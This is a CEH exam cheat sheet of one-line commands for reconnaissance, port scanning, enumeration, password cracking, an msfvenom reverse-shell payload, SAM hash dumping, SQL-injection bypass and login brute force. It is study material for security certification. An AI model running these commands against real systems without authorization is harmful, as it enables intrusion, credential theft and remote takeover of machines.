📄 CEH Command Cheat Sheet

Module 01: Recon & Footprinting

Query target domain registration records:
whois targetcompany.com
Lookup target DNS record types (A, MX, TXT):
nslookup -type=mx targetcompany.com
Dump exif geolocation data from image:
exiftool confidential.jpg

Module 02: Network Scanning

Quiet, stealthy TCP SYN port scan:
nmap -sS -Pn targetip
Brute-force discover subdirectories on site:
gobuster dir -u target.com -w common.txt
Grab service response headers (banner grab):
curl -I https://target.com

Module 03: System Enumeration

Query Windows/Samba system shares & users:
enum4linux -a 192.168.1.5
Walk the remote SNMP device management tree:
snmpwalk -v 2c -c public 192.168.1.10
Query Active Directory / LDAP servers:
ldapsearch -x -H ldap://192.168.1.20

Module 04: Vulnerability Analysis

Search for known exploits locally:
searchsploit apache 2.4
Perform vulnerability scan with Nmap:
nmap -sV --script vuln targetip
Run web server vulnerability scan:
nikto -h http://target.com

Module 05: System Hacking

Crack password hashes using wordlist:
hashcat -m 1000 hash.txt rockyou.txt
Generate reverse shell payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe > shell.exe
Extract SAM hashes via Impacket:
secretsdump.py domain/user:pass@targetip

Module 06: Web App Threats

Classic SQLi Authentication Bypass:
' OR 1=1 --
Fuzz web directories/files:
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ
Brute force web login form:
hydra -l admin -P pass.txt targetip http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
